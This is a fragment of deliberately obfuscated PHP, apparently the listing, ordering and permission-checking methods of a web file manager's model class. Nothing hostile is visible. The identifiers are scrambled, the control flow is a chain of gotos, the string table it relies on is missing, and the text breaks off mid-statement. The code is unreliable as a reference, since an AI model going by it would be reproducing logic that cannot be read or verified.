A¦öÍ‹í„; B®Ì¢¶Öïæ: $this->_listMake($bòÙ…àòÍ‚); return $bòÙ…àòÍ‚; goto fÈ‹ê©Ë”ô; A¦öÍ‹í„: $CÃ‚À˜“Ï‰ =& $_SERVER[›èö’ù¤]; if (!isset($fã«¶±å±Ã[$CÃ‚À˜“Ï‰[425]])) { $fã«¶±å±Ã[$CÃ‚À˜“Ï‰[425]] = 0; } $B˜Î”´ô¢© = $CÃ‚À˜“Ï‰[426]; goto EˆÌÔ±ØòŠ; EˆÌÔ±ØòŠ: $bòÙ…àòÍ‚ = $this->field($B˜Î”´ô¢©)->_makeOrder()->where($fã«¶±å±Ã)->selectPage($e‡¹ˆóìå¡); $this->_listPageCheck($bòÙ…àòÍ‚, $B˜Î”´ô¢©, $fã«¶±å±Ã); $this->_listDataApply($bòÙ…àòÍ‚[$CÃ‚À˜“Ï‰[367]]); goto B®Ì¢¶Öïæ; fÈ‹ê©Ë”ô: } private function _listPageCheck(&$c¶ßàŸøƒ, $D†áœÎù–, $cÆçèˆ¨óµ) { goto EâĞã¾«; cÀÍÜå’í: $D†áœÎù– = $fŠÙ¤ÕÑ†ª[431] . str_replace($fŠÙ¤ÕÑ†ª[47], $fŠÙ¤ÕÑ†ª[432], $D†áœÎù–) . $fŠÙ¤ÕÑ†ª[433]; $e¶™¡©İğÆ = $fŠÙ¤ÕÑ†ª[434]; $e¶™¡©İğÆ = $e¶™¡©İğÆ . $fŠÙ¤ÕÑ†ª[435]; goto Eê»¨¦êª; eØœ°»: if (!$FÜÉÛ‹Òô) { http_close(); ActionCall($fŠÙ¤ÕÑ†ª[429]); } if ($FÜÉÛ‹Òô !== $fŠÙ¤ÕÑ†ª[430]) { return; } $D†áœÎù– = str_replace(array($fŠÙ¤ÕÑ†ª[50], $fŠÙ¤ÕÑ†ª[340], $fŠÙ¤ÕÑ†ª[229]), $fŠÙ¤ÕÑ†ª[33], $D†áœÎù–); goto cÀÍÜå’í; Aùí»±ºÔ: if (strpos($c¹ÂŸÎ™îİ, $fŠÙ¤ÕÑ†ª[436])) { $c¹ÂŸÎ™îİ = str_replace($fŠÙ¤ÕÑ†ª[436], $fŠÙ¤ÕÑ†ª[437], $c¹ÂŸÎ™îİ); } else { $c¹ÂŸÎ™îİ .= $fŠÙ¤ÕÑ†ª[438] . $AôëÆ©Åê[1]; } $C’ìµ²ùŒ = array(); foreach ($cÆçèˆ¨óµ as $Fì¢‰ïÙøí => $eù®ŞÔµù) { $C’ìµ²ùŒ[$fŠÙ¤ÕÑ†ª[431] . $Fì¢‰ïÙøí] = $eù®ŞÔµù; } goto fšš‚Ş›¢î; Eê»¨¦êª: $AˆÛÇ¨’æ© = $a‹ºÉØ²‹—[$fŠÙ¤ÕÑ†ª[361]] * ($a‹ºÉØ²‹—[$fŠÙ¤ÕÑ†ª[351]] - 1) . $fŠÙ¤ÕÑ†ª[47] . $a‹ºÉØ²‹—[$fŠÙ¤ÕÑ†ª[361]]; $AôëÆ©Åê = $this->_makeOrder(!0); $c¹ÂŸÎ™îİ = $fŠÙ¤ÕÑ†ª[431] . str_replace($fŠÙ¤ÕÑ†ª[47], $fŠÙ¤ÕÑ†ª[432], $AôëÆ©Åê[0]); goto Aùí»±ºÔ; CíãÒ®”Òù: if ($a‹ºÉØ²‹—[$fŠÙ¤ÕÑ†ª[366]] <= 1) { return; } if ($a‹ºÉØ²‹—[$fŠÙ¤ÕÑ†ª[365]] >= 100000) { return; } $FÜÉÛ‹Òô = Model($fŠÙ¤ÕÑ†ª[427])->get($fŠÙ¤ÕÑ†ª[428]); goto eØœ°»; fšš‚Ş›¢î: $this->alias($fŠÙ¤ÕÑ†ª[439])->field($D†áœÎù–)->limit($AˆÛÇ¨’æ©)->order($c¹ÂŸÎ™îİ); $DÅÔ–»§® = $this->join($e¶™¡©İğÆ)->where($C’ìµ²ùŒ)->select(); if ($DÅÔ–»§®) { $c¶ßàŸøƒ[$fŠÙ¤ÕÑ†ª[367]] = $DÅÔ–»§®; } goto f·ç„ö; EâĞã¾«: $fŠÙ¤ÕÑ†ª =& $_SERVER[›èö’ù¤]; if (!is_array($c¶ßàŸøƒ[$fŠÙ¤ÕÑ†ª[364]])) { return; } $a‹ºÉØ²‹— = $c¶ßàŸøƒ[$fŠÙ¤ÕÑ†ª[364]]; goto CíãÒ®”Òù; f·ç„ö: } protected function _makeOrder($b‚ƒ‰Ï¸”˜ = false) { goto cÆÕ¼ĞÚøç; aˆÉç†¢Íç: $DŞ•ÒŸÍª = array($bÅ“¥îãğò[443] => $bÅ“¥îãğò[444], $bÅ“¥îãğò[445] => $bÅ“¥îãğò[446]); $f‰óÓ²ÖÖ = array($bÅ“¥îãğò[28] => $bÅ“¥îãğò[28], $bÅ“¥îãğò[78] => $bÅ“¥îãğò[78], $bÅ“¥îãğò[168] => $bÅ“¥îãğò[407], $bÅ“¥îãğò[447] => $bÅ“¥îãğò[447], $bÅ“¥îãğò[448] => $bÅ“¥îãğò[449], $bÅ“¥îãğò[194] => $bÅ“¥îãğò[194], $bÅ“¥îãğò[84] => $bÅ“¥îãğò[84]); $e¬Ø•ÛƒÜô = Input::get($bÅ“¥îãğò[450], $bÅ“¥îãğò[7], $c°³¿È‚, array_keys($f‰óÓ²ÖÖ)); goto bˆ’Ú²Š‹; cÂ®ˆšÉÑ: if ($e¬Ø•ÛƒÜô == $bÅ“¥îãğò[28]) { } $d¾µ¢¼¼‰ = $bÅ“¥îãğò[452] . $f‰óÓ²ÖÖ[$e¬Ø•ÛƒÜô] . $bÅ“¥îãğò[50] . $DŞ•ÒŸÍª[$F½Ì¥À—]; $d¾µ¢¼¼‰ = rtrim(trim($d¾µ¢¼¼‰), $bÅ“¥îãğò[47]); goto dÅó’†á‰ª; cÆÕ¼ĞÚøç: $bÅ“¥îãğò =& $_SERVER[›èö’ù¤]; $c°³¿È‚ = Model($bÅ“¥îãğò[440])->get($bÅ“¥îãğò[441]); $A˜ˆ›‚¯‡‡ = Model($bÅ“¥îãğò[440])->get($bÅ“¥îãğò[442]); goto aˆÉç†¢Íç; dÅó’†á‰ª: if ($b‚ƒ‰Ï¸”˜) { return array($d¾µ¢¼¼‰, $DŞ•ÒŸÍª[$F½Ì¥À—]); } return $this->order($d¾µ¢¼¼‰); goto C²ä˜Ä–ˆÏ; bˆ’Ú²Š‹: $F½Ì¥À— = Input::get($bÅ“¥îãğò[451], $bÅ“¥îãğò[7], $A˜ˆ›‚¯‡‡, array_keys($DŞ•ÒŸÍª)); if (!in_array($e¬Ø•ÛƒÜô, array_keys($f‰óÓ²ÖÖ))) { $e¬Ø•ÛƒÜô = $bÅ“¥îãğò[28]; } if (!in_array($F½Ì¥À—, array_keys($DŞ•ÒŸÍª))) { $e¬Ø•ÛƒÜô = $bÅ“¥îãğò[443]; } goto cÂ®ˆšÉÑ; C²ä˜Ä–ˆÏ: } protected function _listDataApplyItem($cè‰¸‡ŞÉƒ, $eè¢º´ÔÇ = false) { $aŠôšÎÄé© = array($cè‰¸‡ŞÉƒ); $this->_listDataApply($aŠôšÎÄé©, $eè¢º´ÔÇ); return $aŠôšÎÄé©[0]; } protected function _listDataApply(&$c©•à‰Œ‚, $E÷™Û¡ãÈ = false) { goto Cˆëò¯º¶È; DÍÖÌì¦ñƒ: $this->_listAppendUser($c©•à‰Œ‚); $this->_listFilterInfo($c©•à‰Œ‚, $E÷™Û¡ãÈ); $this->_listAppendAuthSecret($c©•à‰Œ‚); goto FÌ¬µ £”ò; Cˆëò¯º¶È: $EŠùâ•åÍ =& $_SERVER[›èö’ù¤]; if (!$c©•à‰Œ‚) { $c©•à‰Œ‚ = array(); return; } $eÕ”äË„Óò = array_to_keyvalue($c©•à‰Œ‚, $EŠùâ•åÍ[33], $EŠùâ•åÍ[397]); goto BÀ‰å¨×åÜ; BÀ‰å¨×åÜ: $eÕ”äË„Óò = array_unique($eÕ”äË„Óò); $this->_listSourceCache($c©•à‰Œ‚); if (!$E÷™Û¡ãÈ) { $this->_listAppendMeta($c©•à‰Œ‚, $eÕ”äË„Óò); $this->_listAppendFileMeta($c©•à‰Œ‚, $eÕ”äË„Óò); $this->_listAppendChildren($c©•à‰Œ‚, $eÕ”äË„Óò); } goto bê¹‚ŒÛá; bê¹‚ŒÛá: $this->_listAppendPath($c©•à‰Œ‚); $this->_listAppendAuth($c©•à‰Œ‚); $this->_listAppendSourceInfo($c©•à‰Œ‚, $eÕ”äË„Óò); goto DÍÖÌì¦ñƒ; FÌ¬µ £”ò: } protected function _listSourceCache($aÁˆäë’) { $CÃ¼Ë…¼î =& $_SERVER[›èö’ù¤]; foreach ($aÁˆäë’ as $Bõé±ŒÇ¦¤) { self::$cacheSourceInfo[$CÃ¼Ë…¼î[453] . $Bõé±ŒÇ¦¤[$CÃ¼Ë…¼î[397]]] = $Bõé±ŒÇ¦¤; } } protected function _listFilterInfo(&$E¦‚â†•¿¢, $e–¸‘Ä¬¾ = false) { $b²øá¶õ =& $_SERVER[›èö’ù¤]; foreach ($E¦‚â†•¿¢ as &$F—†³öìš) { $F—†³öìš = $this->pathInfoFilter($F—†³öìš); self::$cachePathInfo[$b²øá¶õ[454] . intval($e–¸‘Ä¬¾) . $b²øá¶õ[455] . $F—†³öìš[$b²øá¶õ[397]]] = $F—†³öìš; } unset($F—†³öìš); } protected function _listMake(&$eåÍ…·‹åÂ) { $C¶ùÏ¯Ë† =& $_SERVER[›èö’ù¤]; $eåÍ…·‹åÂ[$C¶ùÏ¯Ë†[75]] = array(); $eåÍ…·‹åÂ[$C¶ùÏ¯Ë†[74]] = array(); foreach ($eåÍ…·‹åÂ[$C¶ùÏ¯Ë†[367]] as $D•œ©Ã”) { $D®ï¢¬íØ = $D•œ©Ã”[$C¶ùÏ¯Ë†[405]] == 1 ? $C¶ùÏ¯Ë†[75] : $C¶ùÏ¯Ë†[74]; $eåÍ…·‹åÂ[$D®ï¢¬íØ][] = $D•œ©Ã”; } unset($eåÍ…·‹åÂ[$C¶ùÏ¯Ë†[367]]); } protected function _listAppendMeta(&$E¶ƒ¦ÑÑˆÈ, $d»£†ÑöÆ) { goto dŞÚø›ÉŒ; dŞÚø›ÉŒ: $Aá«Æ¦æĞ³ =& $_SERVER[›èö’ù¤]; $aŒ†Á¢˜ƒ = array($Aá«Æ¦æĞ³[412] => array($Aá«Æ¦æĞ³[413], $d»£†ÑöÆ)); $Dß©†…Üó = Model($Aá«Æ¦æĞ³[456])->field($Aá«Æ¦æĞ³[457])->where($aŒ†Á¢˜ƒ)->select(); goto AÅ»»Ô†™½; AÅ»»Ô†™½: if (!$Dß©†…Üó) { return; } $eÇÂ¾ì„å = array($Aá«Æ¦æĞ³[458], $Aá«Æ¦æĞ³[459], $Aá«Æ¦æĞ³[437]); $få‚ ¿ÏÅÓ = array(); goto E··Æ…ñÅì; E··Æ…ñÅì: foreach ($Dß©†…Üó as $CñØ¸Åâã¢) { if (!isset($få‚ ¿ÏÅÓ[$CñØ¸Åâã¢[$Aá«Æ¦æĞ³[397]]])) { $få‚ ¿ÏÅÓ[$CñØ¸Åâã¢[$Aá«Æ¦æĞ³[397]]] = array(); } if (in_array($CñØ¸Åâã¢[$Aá«Æ¦æĞ³[93]], $eÇÂ¾ì„å)) { continue; } $få‚ ¿ÏÅÓ[$CñØ¸Åâã¢[$Aá«Æ¦æĞ³[397]]][$CñØ¸Åâã¢[$Aá«Æ¦æĞ³[93]]] = $CñØ¸Åâã¢[$Aá«Æ¦æĞ³[372]]; } foreach ($E¶ƒ¦ÑÑˆÈ as &$B…™”„ÁÙ‘) { $B…™”„ÁÙ‘[$Aá«Æ¦æĞ³[460]] = !1; if (isset($få‚ ¿ÏÅÓ[$B…™”„ÁÙ‘[$Aá«Æ¦æĞ³[397]]])) { $B…™”„ÁÙ‘[$Aá«Æ¦æĞ³[460]] = $få‚ ¿ÏÅÓ[$B…™”„ÁÙ‘[$Aá«Æ¦æĞ³[397]]]; } if ($this->fileIsLock($B…™”„ÁÙ‘) && $B…™”„ÁÙ‘[$Aá«Æ¦æĞ³[408]]) { $EÒõ´¨„İŒ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $B…™”„ÁÙ‘[$Aá«Æ¦æĞ³[408]][$Aá«Æ¦æĞ³[409]] = AuthModel::authDisable($B…™”„ÁÙ‘[$Aá«Æ¦æĞ³[408]][$Aá«Æ¦æĞ³[409]], $EÒõ´¨„İŒ); $B…™”„ÁÙ‘[$Aá«Æ¦æĞ³[408]][$Aá«Æ¦æĞ³[461]][$Aá«Æ¦æĞ³[408]] = $B…™”„ÁÙ‘[$Aá«Æ¦æĞ³[408]][$Aá«Æ¦æĞ³[409]]; } } unset($B…™”„ÁÙ‘); goto bÇ…ÚçÂ¸ö; bÇ…ÚçÂ¸ö: } protected function _listAppendFileMeta(&$Eù˜´¯›ùÔ, $Bà°ùä‡•) { goto eİ‹™„ë–; eÙ’±ó˜×: $b‹êˆ·ñôø = $b‹êˆ·ñôø ? $b‹êˆ·ñôø : array(); $Fåøğíöõˆ = array(); foreach ($b‹êˆ·ñôø as $cğ¨´ã¥ë¿) { if (!isset($Fåøğíöõˆ[$cğ¨´ã¥ë¿[$AŸ›±¨…§Ğ[462]]])) { $Fåøğíöõˆ[$cğ¨´ã¥ë¿[$AŸ›±¨…§Ğ[462]]] = array(); } $Fåøğíöõˆ[$cğ¨´ã¥ë¿[$AŸ›±¨…§Ğ[462]]][$cğ¨´ã¥ë¿[$AŸ›±¨…§Ğ[93]]] = $cğ¨´ã¥ë¿[$AŸ›±¨…§Ğ[372]]; } goto aŞ¶ŠÜÂÛƒ; B¬ƒ¾°¢: if (!$dÆ„óí¢»Ñ) { return; } $fö’™¹ = array($AŸ›±¨…§Ğ[463] => array($AŸ›±¨…§Ğ[413], $dÆ„óí¢»Ñ)); $Aºæ÷—“ê› = $AŸ›±¨…§Ğ[464]; goto AÉèÉ©çÜ; eİ‹™„ë–: $AŸ›±¨…§Ğ =& $_SERVER[›èö’ù¤]; $dÆ„óí¢»Ñ = array_to_keyvalue($Eù˜´¯›ùÔ, $AŸ›±¨…§Ğ[33], $AŸ›±¨…§Ğ[462]); $dÆ„óí¢»Ñ = array_filter(array_unique($dÆ„óí¢»Ñ)); goto B¬ƒ¾°¢; AÉèÉ©çÜ: $cÁ»­‡ÓâÆ = Model($AŸ›±¨…§Ğ[465])->field($Aºæ÷—“ê›)->where($fö’™¹)->select(); $cÁ»­‡ÓâÆ = array_to_keyvalue($cÁ»­‡ÓâÆ, $AŸ›±¨…§Ğ[462]); $b‹êˆ·ñôø = Model($AŸ›±¨…§Ğ[466])->field($AŸ›±¨…§Ğ[467])->where($fö’™¹)->select(); goto eÙ’±ó˜×; aŞ¶ŠÜÂÛƒ: foreach ($Eù˜´¯›ùÔ as &$C¨À©Ÿ‹é·) { goto B”˜ñÕ°¹Å; E¸ƒø‘Î½é: unset($cÁ»­‡ÓâÆ[$e…¶˜æÒœ][$AŸ›±¨…§Ğ[76]]); $e…Å½¿œ™Ï = is_array($Fåøğíöõˆ[$e…¶˜æÒœ]) ? $Fåøğíöõˆ[$e…¶˜æÒœ] : array(); $C¨À©Ÿ‹é·[$AŸ›±¨…§Ğ[164]] = array_merge($e…Å½¿œ™Ï, $cÁ»­‡ÓâÆ[$e…¶˜æÒœ]); goto CöğÍ†¿ç¡; CöğÍ†¿ç¡: if (isset($C¨À©Ÿ‹é·[$AŸ›±¨…§Ğ[164]][$AŸ›±¨…§Ğ[163]])) { $C¨À©Ÿ‹é·[$AŸ›±¨…§Ğ[163]] = json_decode($C¨À©Ÿ‹é·[$AŸ›±¨…§Ğ[164]][$AŸ›±¨…§Ğ[163]], !0); unset($C¨À©Ÿ‹é·[$AŸ›±¨…§Ğ[164]][$AŸ›±¨…§Ğ[163]]); } goto a™…çÚé¬; c…Œ¾ö„¼Ÿ: $fó˜¿‹’¥[$AŸ›±¨…§Ğ[78]] = $C¨À©Ÿ‹é·[$AŸ›±¨…§Ğ[78]]; $fó˜¿‹’¥[$AŸ›±¨…§Ğ[28]] = $C¨À©Ÿ‹é·[$AŸ›±¨…§Ğ[28]]; if (!isset(self::$cacheFileInfo[$AŸ›±¨…§Ğ[468] . $e…¶˜æÒœ])) { self::$cacheFileInfo[$AŸ›±¨…§Ğ[468] . $e…¶˜æÒœ] = array_merge(array(), $fó˜¿‹’¥); } goto E¸ƒø‘Î½é; B”˜ñÕ°¹Å: $e…¶˜æÒœ = $C¨À©Ÿ‹é·[$AŸ›±¨…§Ğ[462]]; if (!$e…¶˜æÒœ || !is_array($cÁ»­‡ÓâÆ[$e…¶˜æÒœ])) { continue; } $fó˜¿‹’¥ = $cÁ»­‡ÓâÆ[$e…¶˜æÒœ]; goto c…Œ¾ö„¼Ÿ; a™…çÚé¬: } unset($C¨À©Ÿ‹é·); goto fäÆÄÅß¹; fäÆÄÅß¹: } protected function _listAppendSourceInfo(&$F®’ëà ÖÛ, $FÎÏŒÀù“) { goto CîøŞÅ©œÍ; fÛÄ†²Üëæ: $A§éöÛò˜Û = array_to_keyvalue_group($E§–¡„Ú“Ã, $Fòº¹ëöÇÑ[397]); foreach ($F®’ëà ÖÛ as &$fº¸è‰ğß) { $fº¸è‰ğß[$Fòº¹ëöÇÑ[85]] = array($Fòº¹ëöÇÑ[472] => 0, $Fòº¹ëöÇÑ[473] => 0, $Fòº¹ëöÇÑ[474] => 0); if (isset($CäĞÀŞÛŒš[$fº¸è‰ğß[$Fòº¹ëöÇÑ[397]]])) { $fº¸è‰ğß[$Fòº¹ëöÇÑ[85]][$Fòº¹ëöÇÑ[475]] = 1; $fº¸è‰ğß[$Fòº¹ëöÇÑ[85]][$Fòº¹ëöÇÑ[476]] = $CäĞÀŞÛŒš[$fº¸è‰ğß[$Fòº¹ëöÇÑ[397]]][$Fòº¹ëöÇÑ[28]]; } if (isset($bà“‰Ù†Á‡[$fº¸è‰ğß[$Fòº¹ëöÇÑ[397]]])) { $fº¸è‰ğß[$Fòº¹ëöÇÑ[85]][$Fòº¹ëöÇÑ[477]] = array(); foreach ($bà“‰Ù†Á‡[$fº¸è‰ğß[$Fòº¹ëöÇÑ[397]]] as $E°Â¶Ç¡Ÿ) { $Aš³ø´åğ… = $CîÀÅ™Şì[$E°Â¶Ç¡Ÿ]; $fº¸è‰ğß[$Fòº¹ëöÇÑ[85]][$Fòº¹ëöÇÑ[477]][] = array($Fòº¹ëöÇÑ[478] => $Aš³ø´åğ…[$Fòº¹ëöÇÑ[395]], $Fòº¹ëöÇÑ[415] => $Aš³ø´åğ…[$Fòº¹ëöÇÑ[28]], $Fòº¹ëöÇÑ[479] => $Aš³ø´åğ…[$Fòº¹ëöÇÑ[480]]); } } if (isset($A§éöÛò˜Û[$fº¸è‰ğß[$Fòº¹ëöÇÑ[397]]])) { $fº¸è‰ğß[$Fòº¹ëöÇÑ[85]][$Fòº¹ëöÇÑ[481]] = array(); foreach ($A§éöÛò˜Û[$fº¸è‰ğß[$Fòº¹ëöÇÑ[397]]] as $E•¶«›öÜœ) { $fº¸è‰ğß[$Fòº¹ëöÇÑ[85]][$Fòº¹ëöÇÑ[481]] = array($Fòº¹ëöÇÑ[482] => $E•¶«›öÜœ[$Fòº¹ëöÇÑ[483]], $Fòº¹ëöÇÑ[484] => $E•¶«›öÜœ[$Fòº¹ëöÇÑ[485]], $Fòº¹ëöÇÑ[486] => $E•¶«›öÜœ[$Fòº¹ëöÇÑ[397]], $Fòº¹ëöÇÑ[487] => $E•¶«›öÜœ[$Fòº¹ëöÇÑ[488]], $Fòº¹ëöÇÑ[489] => $E•¶«›öÜœ[$Fòº¹ëöÇÑ[490]], $Fòº¹ëöÇÑ[491] => $E•¶«›öÜœ[$Fòº¹ëöÇÑ[491]], $Fòº¹ëöÇÑ[492] => $E•¶«›öÜœ[$Fòº¹ëöÇÑ[492]]); } } } unset($fº¸è‰ğß); goto E¥È»…ÁÓÄ; CîøŞÅ©œÍ: $Fòº¹ëöÇÑ =& $_SERVER[›èö’ù¤]; if (!defined($Fòº¹ëöÇÑ[469])) { return; } $Eµ„ƒÓšÀƒ = Model($Fòº¹ëöÇÑ[470])->listData(); goto dë¡ïñ“¥Œ; dë¡ïñ“¥Œ: $a©ÙÖŒ™åÈ = Model($Fòº¹ëöÇÑ[420])->listData(); $eŠ‡ÏíÚ–Ñ = Model($Fòº¹ëöÇÑ[410])->listData(); $E§–¡„Ú“Ã = Model($Fòº¹ëöÇÑ[471])->listSimple(); goto B‡Çª—”–; E¥È»…ÁÓÄ: return $F®’ëà ÖÛ; goto e˜ë¾ÁÄ´; B‡Çª—”–: $CîÀÅ™Şì = array_to_keyvalue($Eµ„ƒÓšÀƒ, $Fòº¹ëöÇÑ[395]); $bà“‰Ù†Á‡ = array_to_keyvalue_group($a©ÙÖŒ™åÈ, $Fòº¹ëöÇÑ[76], $Fòº¹ëöÇÑ[421]); $CäĞÀŞÛŒš = array_to_keyvalue($eŠ‡ÏíÚ–Ñ, $Fòº¹ëöÇÑ[76]); goto fÛÄ†²Üëæ; e˜ë¾ÁÄ´: } protected function _listAppendChildren(&$cãŞÌ¹Ñ’İ, $bèñ¤Ú³Âò) { goto Fšƒ´‚ªª; e‡Ó…é÷¹: foreach ($cãŞÌ¹Ñ’İ as &$D‘²àÒáÖ) { if (!$D‘²àÒáÖ[$D†ãçç±ñµ[405]]) { continue; } $F¯˜‡Ú„Ë[] = $D‘²àÒáÖ[$D†ãçç±ñµ[397]]; } unset($D‘²àÒáÖ); if (!$F¯˜‡Ú„Ë) { return; } goto cƒ™»Óƒƒİ; Fšƒ´‚ªª: $D†ãçç±ñµ =& $_SERVER[›èö’ù¤]; $F¯˜‡Ú„Ë = array(); $Aò×ÇÊÍøã = array($D†ãçç±ñµ[203] => 0, $D†ãçç±ñµ[204] => 0); goto e‡Ó…é÷¹; D¡Ô¼ç†Ñ: $b²ŸÀäğº‰ = array(); foreach ($AİçÉ¢‡Õ as $B¦ÍŞÉ‡ä) { $DÇîŞÀù‚Ò = $B¦ÍŞÉ‡ä[$D†ãçç±ñµ[493]]; $d˜Ş˜ÊÁí‹ = $B¦ÍŞÉ‡ä[$D†ãçç±ñµ[405]] == $D†ãçç±ñµ[87] ? $D†ãçç±ñµ[204] : $D†ãçç±ñµ[203]; if (!isset($b²ŸÀäğº‰[$DÇîŞÀù‚Ò])) { $b²ŸÀäğº‰[$DÇîŞÀù‚Ò] = array($D†ãçç±ñµ[203] => 0, $D†ãçç±ñµ[204] => 0); } $b²ŸÀäğº‰[$DÇîŞÀù‚Ò][$d˜Ş˜ÊÁí‹] += $B¦ÍŞÉ‡ä[$D†ãçç±ñµ[495]]; } foreach ($cãŞÌ¹Ñ’İ as &$D‘²àÒáÖ) { if (!$D‘²àÒáÖ[$D†ãçç±ñµ[405]]) { continue; } $b²È©êÊ±… = is_array($b²ŸÀäğº‰[$D‘²àÒáÖ[$D†ãçç±ñµ[397]]]) ? $b²ŸÀäğº‰[$D‘²àÒáÖ[$D†ãçç±ñµ[397]]] : $Aò×ÇÊÍøã; $D‘²àÒáÖ[$D†ãçç±ñµ[204]] = $b²È©êÊ±…[$D†ãçç±ñµ[204]]; $D‘²àÒáÖ[$D†ãçç±ñµ[203]] = $b²È©êÊ±…[$D†ãçç±ñµ[203]]; unset($D‘²àÒáÖ[$D†ãçç±ñµ[407]]); } goto BËóØ…á›ğ; BËóØ…á›ğ: unset($D‘²àÒáÖ); goto CÏ®ßÈ¼âî; cƒ™»Óƒƒİ: $c›İßÒ¯ª = array($D†ãçç±ñµ[493] => array($D†ãçç±ñµ[7], $F¯˜‡Ú„Ë)); $DÂŸ—ÇÑ = array($D†ãçç±ñµ[493], $D†ãçç±ñµ[405], $D†ãçç±ñµ[494] => $D†ãçç±ñµ[495]); $AİçÉ¢‡Õ = $this->field($DÂŸ—ÇÑ)->where($c›İßÒ¯ª)->group($D†ãçç±ñµ[496])->select(); goto D¡Ô¼ç†Ñ; CÏ®ßÈ¼âî: } protected function _listAppendAuth(&$bÃƒääíì±) { goto FòèäŠ­¢; BØÄ‘Õ¸¢: foreach ($bÃƒääíì± as $c´ÆÌó‹À) { if ($c´ÆÌó‹À[$Bì©ˆŠ÷à‘[406]] == self::TYPE_GROUP) { $d‘¢Ä·¤ó¯[] = $c´ÆÌó‹À[$Bì©ˆŠ÷à‘[397]]; } } if (!$d‘¢Ä·¤ó¯) { return; } $a‚±ÆñË–’ = array_to_keyvalue($bÃƒääíì±, $Bì©ˆŠ÷à‘[397]); goto e„Ï×İæ£; FòèäŠ­¢: $Bì©ˆŠ÷à‘ =& $_SERVER[›èö’ù¤]; if (!defined($Bì©ˆŠ÷à‘[469])) { return; } $d‘¢Ä·¤ó¯ = array(); goto BØÄ‘Õ¸¢; e„Ï×İæ£: $F¤Ì‰¨â³× = Model($Bì©ˆŠ÷à‘[497])->getSourceList($d‘¢Ä·¤ó¯, $a‚±ÆñË–’); foreach ($bÃƒääíì± as $EÎØÆÈÄ¶ => &$c´ÆÌó‹À) { $c´ÆÌó‹À[$Bì©ˆŠ÷à‘[408]] = $F¤Ì‰¨â³×[$c´ÆÌó‹À[$Bì©ˆŠ÷à‘[397]]]; if (!$c´ÆÌó‹À[$Bì©ˆŠ÷à‘[408]] && $c´ÆÌó‹À[$Bì©ˆŠ÷à‘[406]] == self::TYPE_GROUP) { $c´ÆÌó‹À[$Bì©ˆŠ÷à‘[408]] = Action($Bì©ˆŠ÷à‘[498])->pathGroupAuthMake($c´ÆÌó‹À[$Bì©ˆŠ÷à‘[499]]); if (!$c´ÆÌó‹À[$Bì©ˆŠ÷à‘[408]] && !_get($GLOBALS, $Bì©ˆŠ÷à‘[500])) { $c´ÆÌó‹À[$Bì©ˆŠ÷à‘[196]] = !1; $c´ÆÌó‹À[$Bì©ˆŠ÷à‘[195]] = !1; } } if ($c´ÆÌó‹À[$Bì©ˆŠ÷à‘[408]]) { $c´ÆÌó‹À[$Bì©ˆŠ÷à‘[196]] = AuthModel::authCheckEdit($c´ÆÌó‹À[$Bì©ˆŠ÷à‘[408]][$Bì©ˆŠ÷à‘[409]]); $c´ÆÌó‹À[$Bì©ˆŠ÷à‘[195]] = AuthModel::authCheckView($c´ÆÌó‹À[$Bì©ˆŠ÷à‘[408]][$Bì©ˆŠ÷à‘[409]]); } $this->groupPathDisplay($c´ÆÌó‹À); } unset($c´ÆÌó‹À); goto c‚§’İƒ¢Ø; c‚§’İƒ¢Ø: } public function _listAppendAuthSecret(&$Aí¿Ä¿ÉÉ) { goto cğÃø›……ã; cğÃø›……ã: $dâô’ïù”î =& $_SERVER[›èö’ù¤]; if (Model($dâô’ïù”î[427])->get($dâô’ïù”î[501]) != $dâô’ïù”î[87]) { return; } static $cù„±Ê±ö = false; goto dÏ¬®“Ìñ; dÏ¬®“Ìñ: if (!$cù„±Ê±ö) { goto EçÊÒ¹Úß; dœß—‡öĞæ: foreach ($cù„±Ê±ö as $F½¾ŠïÆ›Ğ => $cŸªß’’Ğ) { goto fÆé·õ ñ; FÅ½Êùå‡: if (!$a¼Ã‚ŒÑë‘) { $FŠ»¥ÛÙ¥ƒ->remove($cŸªß’’Ğ[$dâô’ïù”î[395]]); unset($cù„±Ê±ö[$F½¾ŠïÆ›Ğ]); continue; } $cŸªß’’Ğ[$dâô’ïù”î[408]] = $a¼Ã‚ŒÑë‘; $cŸªß’’Ğ[$dâô’ïù”î[506]] = $A‹µïÅ”œ; goto C˜®´•„Ÿ¾; fÆé·õ ñ: $A‹µïÅ”œ = $b¿ïŞñÛ÷†[$cŸªß’’Ğ[$dâô’ïù”î[505]]]; if (!$A‹µïÅ”œ) { $FŠ»¥ÛÙ¥ƒ->remove($cŸªß’’Ğ[$dâô’ïù”î[395]]); unset($cù„±Ê±ö[$F½¾ŠïÆ›Ğ]); continue; } $a¼Ã‚ŒÑë‘ = $aÀåŒÃÕ¢->listData($A‹µïÅ”œ[$dâô’ïù”î[408]]); goto FÅ½Êùå‡; C˜®´•„Ÿ¾: $cŸªß’’Ğ[$dâô’ïù”î[507]] = Model($dâô’ïù”î[508])->getInfoSimpleOuter($cŸªß’’Ğ[$dâô’ïù”î[447]]); $cù„±Ê±ö[$F½¾ŠïÆ›Ğ] = $cŸªß’’Ğ; goto C…‰ìÇ¯Ù¬; C…‰ìÇ¯Ù¬: } goto F¶¼²…¼†; AºÏöôô•é: $cù„±Ê±ö = array_to_keyvalue($cù„±Ê±ö, $dâô’ïù”î[397]); $b¿ïŞñÛ÷† = json_decode(Model($dâô’ïù”î[427])->get($dâô’ïù”î[504]), !0); $b¿ïŞñÛ÷† = array_to_keyvalue($b¿ïŞñÛ÷†, $dâô’ïù”î[395]); goto dœß—‡öĞæ; EçÊÒ¹Úß: $aÀåŒÃÕ¢ = Model($dâô’ïù”î[502]); $FŠ»¥ÛÙ¥ƒ = Model($dâô’ïù”î[503]); $cù„±Ê±ö = $FŠ»¥ÛÙ¥ƒ->listData(); goto AºÏöôô•é; F¶¼²…¼†: } $FŸá„„ÏºË = defined($dâô’ïù”î[509]) ? USER_ID : $dâô’ïù”î[33]; $E¦Áéùëï = array(); goto bÈØÜÈê‘; bÈØÜÈê‘: $fÌÁ˜ƒ‹œç = $this->_listAppendPath($E¦Áéùëï, !0); foreach ($Aí¿Ä¿ÉÉ as $F½¾ŠïÆ›Ğ => &$cŸªß’’Ğ) { if (!is_array($cŸªß’’Ğ[$dâô’ïù”î[408]])) { continue; } if ($cŸªß’’Ğ[$dâô’ïù”î[406]] != $dâô’ïù”î[510]) { continue; } if (isset($cù„±Ê±ö[$cŸªß’’Ğ[$dâô’ïù”î[397]]])) { goto b”±ó”³Ú¦; b”±ó”³Ú¦: $BáëÖ…Çâ¶ = 